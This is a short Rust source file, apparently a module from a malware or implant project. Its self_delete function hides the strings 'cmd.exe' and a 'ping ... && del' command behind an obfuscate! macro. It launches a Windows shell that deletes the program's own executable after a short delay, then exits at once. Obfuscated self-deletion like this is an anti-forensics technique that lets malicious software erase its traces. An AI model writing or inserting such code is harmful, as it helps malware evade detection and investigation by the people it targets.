use anyhow::Result;

use crate::obfuscate;

pub fn self_delete() -> Result<()>{
	let exe = std::env::current_exe()?;
	let exe_str = exe.to_string_lossy().to_string();

	let cmd  = &obfuscate!("cmd.exe");
	let body = &format!("{} {}", obfuscate!("ping 127.0.0.1 -n 3 > nul && del"), exe_str);
	let output = std::process::Command::new(cmd)
		.args(["/c", body])
		.spawn()?;

	std::process::exit(0);
	Ok(())
}